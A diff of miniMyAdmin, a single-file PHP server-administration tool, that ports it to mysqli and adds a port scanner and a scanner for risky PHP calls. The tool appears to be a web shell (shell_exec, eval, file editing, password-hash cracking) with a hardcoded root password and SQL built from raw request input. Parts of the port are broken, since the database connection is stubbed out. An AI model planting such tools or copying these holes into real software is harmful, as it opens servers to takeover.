@@ -2,9 +2,9 @@
 /*
  * miniMyAdmin
  *
- * @author lauri@bytez.net
- * @copyright lauri@bytez.net 2006
- * @version $Id: my.php 33 2006-08-30 19:51:11Z lauri $
+ * @author lauri kasvandik
+ * @copyright lauri.kasvandik[a]eesti.ee, 2006-2008
+ * @version $Id: my.php 39 2008-11-22 17:48:03Z lauri $
  */
 
 $ini = array();
@@ -17,7 +17,7 @@ if(is_file($inifile = 'my.ini.php'))
  * you should change root_pass
  *
  */
-$root_pass = "kala"; // <-- this is password which we use, if there are ini-file not found
+$root_pass = "q9724qt2g"; // <-- this is password which we use, if there are ini-file not found
 define('root_pass', isset($ini['root_pass']) ? $ini['root_pass'] : $root_pass);
 
 /**
@@ -49,7 +49,7 @@ define('hack', true);
  * script version (added automatically on svn commit)
  *
  */
-define('version', '$Id: my.php 33 2006-08-30 19:51:11Z lauri $');
+define('version', '$Id: my.php 39 2008-11-22 17:48:03Z lauri $');
 
 /**
  * If true then outputs notices/warnings/errors and
@@ -123,7 +123,6 @@ if(isset($_REQUEST['out']))
     redirect(self);
 }
 
-
 // login
 if(empty($_SESSION['root']))
 {
@@ -138,8 +137,7 @@ if(empty($_SESSION['root']))
 
 if(!empty($_SESSION['mysql']))
 {
-    mysql_connect($_SESSION['mysql']['host'], $_SESSION['mysql']['user'], $_SESSION['mysql']['pass']);
-    mysql_select_db($_SESSION['mysql']['db']);
+    // mysqli_connect("p:" . $_SESSION['mysql']['host'], $_SESSION['mysql']['user'], $_SESSION['mysql']['pass'], $_SESSION['mysql']['db']);
 }
 
 if(empty($_SESSION['info']))
@@ -206,6 +204,18 @@ elseif(isset($_REQUEST['filem']))
 elseif(isset($_REQUEST['editfile']))
 {
     $tpl_vars['mainbody'] = action_editfile();
+}
+elseif(isset($_REQUEST['analyzefile']))
+{
+    $tpl_vars['mainbody'] = action_analyzefile();
+}
+elseif(isset($_REQUEST['portscan']))
+{
+    $tpl_vars['mainbody'] = action_portscan();
+}
+elseif(isset($_REQUEST['about']))
+{
+    $tpl_vars['mainbody'] = action_about();
 }
 else
 {
@@ -293,7 +303,7 @@ function action_settings()
         $p = array();
         $p['debug'] = setif($_COOKIE['ma']['debug'], 0);
         $p['err_rep'] = isset($_COOKIE['ma']['err_rep']) ? $_COOKIE['ma']['err_rep'] : error_reporting();
-        $p['time_limit'] = isset($_COOKIE['ma']['time_limit']) ? $_COOKIE['ma']['time_limit'] : ini_get('max_execution_time');
+        $p['time_limit'] = isset($_COOKIE['ma']['time_limit']) ? $_COOKIE['ma']['time_limit'] : ini_get('max_execution_time');    
         $p['strip_slashes'] = isset($_COOKIE['ma']['strip_slashes']) ? $_COOKIE['ma']['strip_slashes'] : 0;
     }
     
@@ -303,7 +313,7 @@ function action_settings()
     #$output .= '<tr><th>error_reporting</th><td><input name="err_rep" value="'.$p['err_rep'].'"></td><td>enter integer, 0 = errors off, <a href="http://php.net/error_reporting" target="_blank">more info</a> (Nb.error_reporting doesnt work for fatal errors)</td></tr>';
     $output .= '<tr><th>debug mode</th><td>'.html_selectbox('debug', array(1=>'yes', 0=>'no'), $p['debug']).'</td><td>select "yes" if you like to see php error messages and _REQUEST/_SESSION variables</td></tr>';
     $output .= '<tr><th>script execution time</th><td><input name="time_limit" value="'.$p['time_limit'].'"></td><td>time in seconds, 0 is infinite</td></tr>';
-    $output .= '<tr><th>strip slashes</th><td>'.html_selectbox('strip_slashes', array(0=>'dont fix', 'strip_slashes'), $p['strip_slashes']).'</td><td>choose strip_slashes if there are slashes before quotes (\") in GET/POST variables (on eval() page etc)</td></tr>';
+    $output .= '<tr><th>strip slashes</th><td>'.html_selectbox('strip_slashes', array(0=>'dont fix', 'strip_slashes'), $p['strip_slashes']).'</td><td>choose strip_slashes if there are slashes before quotes (\") in GET/POST variables (on eval() page etc [magic_quotes])</td></tr>';
     $output .= '<tr><td> </td><td><input type="submit" value="save"></td><td> </td></tr>';
     $output .= '</table>';
     $output .= '</form>';
@@ -493,18 +503,7 @@ function action_eval()
 function action_sql_1()
 {
     $tpl_vars = array();
-    if(!empty($_POST))
-    {
-        if(mysql_connect($_POST['mysql']['host'], $_POST['mysql']['user'], $_POST['mysql']['pass']) && mysql_select_db($_POST['mysql']['db']))
-        {
-            $_SESSION['mysql'] = $_POST['mysql'];
-            redirect(encode_link(self, array('mysql'=>4)));
-        }
-        else
-        {
-            $tpl_vars['connectmsg'] = '<p>Error on connecting. '. mysqli_error($GLOBALS["db_link"]).'</p>';
-        }
-    }
+    // FAF: Do nothing
     return parse_tpl(get_tpl('connect2mysql'), $tpl_vars);
 }
 
@@ -531,16 +530,16 @@ function action_sql_3()
         }
         else
         {
-            $result = mysql_query($_POST['sqlcmd']);
+            $result = mysqli_query($GLOBALS["db_link"], $_POST['sqlcmd']);
             $lines = array();
     
             if(mysqli_num_rows($result))
             {    
-                while($row = mysql_fetch_assoc($result))
+                while($row = mysqli_fetch_assoc($result))
                     $lines[] = $row;
             }
     
-            if(mysql_errno())
+            if(mysqli_errno($GLOBALS["db_link"]))
             {
                 $tpl_vars['result'] = '<p class="error">Error: '.mysqli_error($GLOBALS["db_link"]).'</p>';
             }
@@ -602,6 +601,7 @@ function action_sql_3()
         '',
         'SELECT VERSION()',
         'SHOW TABLES FROM '.$_SESSION['mysql']['db'],
+        'SELECT @@datadir;',
         'SHOW DATABASES',
         'SHOW CREATE TABLE `table_name`',
         'DESCRIBE `table_name`',
@@ -641,7 +641,7 @@ function action_sql_4_insert_data()
 {
     $output = '<h1>add row to '.$_REQUEST['tbl'].'</h1>';
     
-    $result = mysql_query('DESCRIBE '.$_REQUEST['tbl']);
+    $result = mysqli_query($GLOBALS["db_link"], 'DESCRIBE '.$_REQUEST['tbl']);
     
     if(!mysqli_num_rows($result))
     {
@@ -650,7 +650,7 @@ function action_sql_4_insert_data()
     else
     {
         $fields = array();
-        while($field = mysql_fetch_assoc($result))
+        while($field = mysqli_fetch_assoc($result))
         {
             $fields[] = $field;
         }
@@ -678,8 +678,8 @@ function action_sql_4_insert_data()
                     }
                     $sql_insert .= join(', ', $sql_insert_fields);
                     
-                    @mysql_query($sql_insert);
-                    if(mysql_errno())
+                    @mysqli_query($GLOBALS["db_link"], $sql_insert);
+                    if(mysqli_errno($GLOBALS["db_link"]))
                     {
                         $output .= '<p class="error">Error on saving: '.mysqli_error($GLOBALS["db_link"]).'<br>'.$sql_insert.'</p>';
                     }
@@ -727,7 +727,7 @@ function action_sql_4_edit_row()
 {
     $output = '<h1>edit '.$_REQUEST['tbl'].' WHERE '.$_REQUEST['pk'].'="'.$_REQUEST['id'].'"</h1>';
     $sql_getrow = 'SELECT * FROM '.$_REQUEST['tbl'].' WHERE '.$_REQUEST['pk'].'="'.$_REQUEST['id'].'" LIMIT 1';
-    $result = mysql_query($sql_getrow);
+    $result = mysqli_query($GLOBALS["db_link"], $sql_getrow);
     if(!mysqli_num_rows($result))
     {
         $output .= '<p>Query failed:'.$sql_getrow.'</p>';
@@ -736,7 +736,7 @@ function action_sql_4_edit_row()
     {
         if(empty($_POST))
         {
-            $data = mysql_fetch_assoc($result);
+            $data = mysqli_fetch_assoc($result);
         }
         else
         {
@@ -754,8 +754,8 @@ function action_sql_4_edit_row()
             }
             else
             {
-                @mysql_query($sql_update);
-                if(mysql_errno())
+                @mysqli_query($GLOBALS["db_link"], $sql_update);
+                if(mysqli_errno($GLOBALS["db_link"]))
                 {
                     $output .= '<p class="error">Update query fails: '.mysqli_error($GLOBALS["db_link"]).'<br>'.htmlspecialchars($sql_update).'</p>';
                 }
@@ -811,11 +811,11 @@ function action_sql_4_browse_table()
     $output = '<h1>content of '.$_SESSION['mysql']['db'].'.'.$_REQUEST['tbl'].'</h1>';
     
     $perpage = (isset($_REQUEST['perpage'])) ? $_REQUEST['perpage'] : 30;
-    $count_rows = mysql_result(mysql_query('SELECT COUNT(*) FROM '.$_REQUEST['tbl']), 0);
+    $count_rows = mysqli_fetch_row(mysqli_query($GLOBALS["db_link"], 'SELECT COUNT(*) FROM '.$_REQUEST['tbl']))[0];
     
     $pager = pager($count_rows, $perpage, 'page', encode_link(self, array('tbl'=>$_REQUEST['tbl'], 'mysql'=>'4', 'cmd'=>'browse_table', 'pk'=>setif($_REQUEST['pk'],""))).'&page=__CURRENT_PAGE__', '<b>%u</b>', 20);
     
-    $result = mysql_query('SELECT * FROM '.$_REQUEST['tbl'].' LIMIT '.$pager['limit']);
+    $result = mysqli_query($GLOBALS["db_link"], 'SELECT * FROM '.$_REQUEST['tbl'].' LIMIT '.$pager['limit']);
     $rows = array();
     if(mysqli_num_rows($result))
     {
@@ -823,7 +823,7 @@ function action_sql_4_browse_table()
         if(!empty($pager['navbar']))
             $navbar = 'Pages: ' . join(', ',$pager['navbar']);
             
-        while($r = mysql_fetch_assoc($result))
+        while($r = mysqli_fetch_assoc($result))
             $rows[] = $r;
                 $header_fields = array_merge(array('admin'), array_keys($rows[0]));
         
@@ -884,10 +884,10 @@ function action_sql_4_browse_table()
 function action_sql_4_view_table()
 {
     $output = '<h1>structure of '.$_SESSION['mysql']['db'].'.'.$_REQUEST['tbl'].'</h1>';
-    $result = mysql_query('DESCRIBE '.$_REQUEST['tbl']);
-    if(is_resource($result) && mysqli_num_rows($result))
+    $result = mysqli_query($GLOBALS["db_link"], 'DESCRIBE '.$_REQUEST['tbl']);
+    if(mysqli_num_rows($result))
     {
-        while($r = mysql_fetch_assoc($result))
+        while($r = mysqli_fetch_assoc($result))
             $rows[] = $r;
         
         $primary_key = NULL;
@@ -943,25 +943,26 @@ function action_sql_4_list_tables()
 {
     $output = '<h1>tables in '.$_SESSION['mysql']['db'].'</h1>';
     $tables = array();
-    $result = mysql_list_tables($_SESSION['mysql']['db']);
+    $result = mysqli_query($GLOBALS["db_link"], "SELECT table_name, table_type, table_rows, auto_increment, create_time, update_time, table_comment FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '" . $_SESSION['mysql']['db'] . "';");
     if(mysqli_num_rows($result))
     {
-        $result2 = mysql_query('SHOW TABLE STATUS FROM '.$_SESSION['mysql']['db']);
-        while($t = mysql_fetch_assoc($result2))
+        //$result2 = mysqli_query($GLOBALS["db_link"], 'SHOW TABLE STATUS FROM '.$_SESSION['mysql']['db']);
+        $result2 = mysqli_query($GLOBALS["db_link"], "SELECT table_name, table_type, table_rows, auto_increment, create_time, update_time, table_comment FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '" . $_SESSION['mysql']['db'] . "';");
+        while($t = mysqli_fetch_assoc($result2))
         {
             $tables[] = $t;
         }
         
-        #$header_fields = array_keys($tables[0]);
-        $header_fields = array(
-            'Name'=>'Name',
-            'Type'=>'Type',
-            'Rows'=>'Rows',
-            'Auto_increment'=>'AutoId',
-            'Create_time'=>'Created',
-            'Update_time'=>'Updated',
-            'Comment'=>'Comment'
-        );
+        $header_fields = array_keys($tables[0]);
+        #$header_fields = array(
+        #    'Name'=>'Name',
+        #    'Type'=>'Type',
+        #    'Rows'=>'Rows',
+        #    'Auto_increment'=>'AutoId',
+        #    'Create_time'=>'Created',
+        #    'Update_time'=>'Updated',
+        #    'Comment'=>'Comment'
+        #);
         $output .= '<table><tr class="table_header">';
         foreach($header_fields as $hf)
             $output.='<th>'.$hf.'</th>';
@@ -979,7 +980,7 @@ function action_sql_4_list_tables()
                     #if(in_array($field_key, array('Create_time', 'Update_time')))
                     #    $field= kui_vana(strtotime($field));
                     
-                    if($field_key=='Name')
+                    if($field_key=='table_name')
                         $field = html_encode_link($field, self, array('cmd'=>'view_table', 'tbl'=>$field, 'mysql'=>4));
                     $align = (is_numeric($field)) ? ' align="right"' : '';
                     $output .= '<td'.$align.'>'.$field.'</td>';
@@ -1005,10 +1006,10 @@ function action_sql_4_list_tables()
 function action_sql_5()
 {
     $output = '<h1>mysql export</h1>';
-    $sql_tables = mysql_query('SHOW TABLE STATUS FROM '.$_SESSION['mysql']['db']);
+    $sql_tables = mysqli_query($GLOBALS["db_link"], 'SHOW TABLE STATUS FROM '.$_SESSION['mysql']['db']);
     if(mysqli_num_rows($sql_tables))
     {
-        while($table = mysql_fetch_assoc($sql_tables))
+        while($table = mysqli_fetch_assoc($sql_tables))
         {
             $tables[] = $table;
         }
@@ -1262,7 +1263,7 @@ function action_filemanager()
                 <td align="right">'.filesize_format(filesize($fip)).'</td>
                 <td>'.getperms($fip).'</td>
                 <td align="right" title="'.date('Y-m-d H:i:s', filemtime($fip)).'">'.how_old(filemtime($fip)).'</td>
-                <td>'.((is_writeable($fip))?html_encode_link('edit', self, array('editfile'=>1, 'path'=>$fip)):'').'</td>
+                <td>'.((is_writeable($fip))?html_encode_link('edit', self, array('editfile'=>1, 'path'=>$fip)):'').(is_readable($fip)&&eregi('php$',$fip)?' '.html_encode_link('analyze', self,array('analyzefile'=>1,'filepath'=>$fip)):'').'</td>
             </tr>';
         }
     }
@@ -1315,6 +1316,80 @@ function action_editfile()
 }
 
 /**
+ * analyzes php-file for possible bugs
+ *
+ * @return string
+ */
+function action_analyzefile()
+{
+    return scanForPHPBugs($_REQUEST['filepath']);
+}
+
+/**
+ * simple portscanner
+ *
+ * @return string
+ */
+function action_portscan()
+{
+    $ret = '<h2>Portscanner</h2>';
+    
+    if(!empty($_POST))
+    {
+        $p = array_map('htmlspecialchars', $_REQUEST);
+
+        if($p['port'] > 1 && $p['port'] < 65600)
+        {
+            $fp = @fsockopen($p['ip'], $p['port'], $err, $err2, 30);
+            if(is_resource($fp))
+            {
+                fclose($fp);
+                $ret .= '<b>Port is opened!</b>';
+            }
+            else
+            {
+                $ret .= '<b>Port closed or server down.</b>';
+            }
+        }
+        else
+        {
+            $ret .= 'error: case out of control :P';
+        }
+    }
+    else
+    {
+        $p = array();
+        $p['ip'] = strlen($_SERVER['HTTP_VIA']) ? 'not found your ip' : $_SERVER['REMOTE_ADDR'];
+        $p['port'] = 80;
+    }
+
+    $ret .= '<form action="'.self.'" method="post">';
+    $ret .= html_hidden(array('portscan'=>1));
+    $ret .= '<input type="text" name="ip" value="'.($p['ip']).'">
+    <input type="text" name="port" value="'.($p['port']).'">
+    <input type="submit" name="submit" value="portscan">
+    </form>';
+    
+    return $ret;
+}
+
+/**
+ * returns help
+ *
+ * @return string
+ */
+function action_about()
+{
+  return <<<eod
+      <fieldset><legend><h2>miniMyAdmin</h2></legend>
+      <p>miniMyAdmin is little tool for managing server ressources ;-)</p>
+      <p>Its homepage is http://web.zone.ee/internetu/php/minimyadmin/ also available at Subversion repository http://tools.assembla.com/miniMyAdmin/wiki/WikiStart</p>
+      <p>If you have to say something useful then feel free to contact me!</p>
+      <p>Kopimi 2006-2008 lauri.kasvandik [eesti] ee</p></fieldset>
+eod;
+}
+
+/**
  * returns mainmenu
  *
  * @return string
@@ -1322,19 +1397,19 @@ function action_editfile()
 function get_menu()
 {
     global $authstr;
-    $mysql_menu = '<h2>mysql</h2>';
+    $mysqli_menu = '<h2>mysql</h2>';
 
     if(empty($_SESSION['mysql']))
     {
-        $mysql_menu .= '<ul><li>'.html_encode_link('mysql_connect()',self,array('mysql'=>1)).'</li></ul>';
+        $mysqli_menu .= '<ul><li>'.html_encode_link('mysqli_connect()',self,array('mysql'=>1)).'</li></ul>';
     }
     else
     {
-        $mysql_menu .= '<ul>
+        $mysqli_menu .= '<ul>
             <li>'.html_encode_link('visual editor',self,array('mysql'=>4)).'</li>
             <li>'.html_encode_link('raw sql',self,array('mysql'=>3)).'</li>
             <li>'.html_encode_link('export',self,array('mysql'=>5)).'</li>
-            <li>'.html_encode_link('mysqli_close($GLOBALS["db_link"])',self,array('mysql'=>2)).'</li>
+            <li>'.html_encode_link('mysqli_close()',self,array('mysql'=>2)).'</li>
         </ul>';
     }
 
@@ -1342,15 +1417,17 @@ function get_menu()
         <ul>
         <li>'.html_encode_link('home',self,array()).'</li>
         <li>'.html_encode_link('phpinfo()',self,array('phpinfo'=>1)).'</li>
+        <li>'.html_encode_link('About',self,array('about'=>1)).'</li>
         </ul>
         <h2>filemanager</h2>
         <ul><li>'.html_encode_link("dir->read()",self,array('filem'=>1)).'</li></ul>
         <h2>php-shell</h2>
         <ul><li>'.html_encode_link('shell_exec()',self,array('shell'=>1)).'</li>
         <li>'.html_encode_link('eval()',self,array('eval'=>1)).'</li></ul>'.
-        $mysql_menu.'
+        $mysqli_menu.'
         <h2>utils</h2>
         <ul><li>'.html_encode_link('getPassByHash()',self,array('pwd_hck'=>1)).'</li></ul>
+        <ul><li>'.html_encode_link('portScanner()',self,array('portscan'=>1)).'</li></ul>
         <h2>Settings</h2>
         <ul><li>'.html_encode_link('con figure out',self,array('settings'=>1)).'</li></ul>
         <h2>This Server</h2>
@@ -1379,16 +1456,16 @@ function export_tables_now($tables)
         $output .= "\nDROP TABLE IF EXISTS `$table`;\n\n";
 
     
-        $create_table = mysql_fetch_row(mysql_query("show create table $table"));
+        $create_table = mysqli_fetch_row(mysqli_query($GLOBALS["db_link"], "show create table $table"));
 
         $output .= "--\n-- Table structure for '$table'\n--\n\n";
 
         $output .= $create_table[1]."; \n\n";
 
-        $data = mysql_query("select * from $table");
+        $data = mysqli_query($GLOBALS["db_link"], "select * from $table");
 
         $recs = 0;
-        while ($rd = mysql_fetch_row($data))
+        while ($rd = mysqli_fetch_row($data))
         {
             $recs++;
 
@@ -2001,16 +2078,16 @@ function encode_link($url, $params)
 /**
  * generates encoded link with html <a> tag
  *
- * @param string $name link text
+ * @param string $text link text
  * @param string $url
  * @param array $params
  * @param string $options
  * @return string
  */
-function html_encode_link($name, $url, $params, $options="")
+function html_encode_link($text, $url, $params, $options="")
 {
     $url = encode_link($url, $params);
-    return sprintf('<a href="%s" title="%s">%s</a>', $url, $url, $name);
+    return sprintf('<a href="%s" title="%s">%s</a>', $url, $url, $text);
 }
 
 
@@ -2423,6 +2500,52 @@ function setif(&$variable, $value)
     return isset($variable) ? $variable : $value;
 }
 
+function scanForPHPBugs($fn)
+{
+    if(!is_file($fn))
+        return 'file not found, '.htmlspecialchars($fn);
+
+    $return = '';
+
+    $a = file($fn);
+    
+    if(count($a))
+    {
+        foreach($a as $n=>$s)
+        {
+          if(preg_match('/include|require|fopen|file_get_contents|parse_ini_file/i',$s))
+              $t = "file operation\n";
+          elseif(preg_match('/mysql_connect|sqlite_open/i',$s))
+              $t = "db connect\n";
+          elseif(preg_match('/mysql_query|sqlite_query/i', $s))
+              $t = "db query\n";
+          elseif(preg_match('/exec|system|passthru/i',$s))
+            $t = "prog execution\n";
+          else
+              $t='';
+        
+          if(strlen($t))
+          {
+            
+            // prev 5. lines for tooltips
+            if($n>4)
+            {
+                $l=$t;
+                $m=$n-5;
+                while($n>$m)
+                {
+                    $m++;
+                    $l .= $m.': '.$a[$m];
+                }
+            }
+            $t='';
+            $bg = $n%2?'#fafafe':'fefef0';
+            $return .= '<div style="border:2px solid #ccc;background-color:'.$bg.'" title="'.htmlspecialchars($l).'">'.$t." #".$n.' '.htmlspecialchars($s)."</div>\n";
+          }
+        }
+    }
+    return $return;
+}
 // EOF :)
 
 ?>
